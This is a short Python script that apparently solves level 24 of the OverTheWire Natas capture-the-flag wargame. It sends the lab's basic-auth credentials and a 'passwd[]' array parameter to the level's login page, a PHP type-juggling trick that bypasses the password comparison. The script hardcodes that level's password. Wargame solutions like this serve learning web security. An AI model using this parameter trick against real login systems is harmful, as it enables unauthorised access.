# Overthewire: Natas 24
# woanmeo11

import requests


url = 'http://natas24.natas.labs.overthewire.org/'
auth = ('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg')

r = requests.get(url, auth=auth, params={'passwd[]': '', 'submit': 'Login'})
print(r.text)
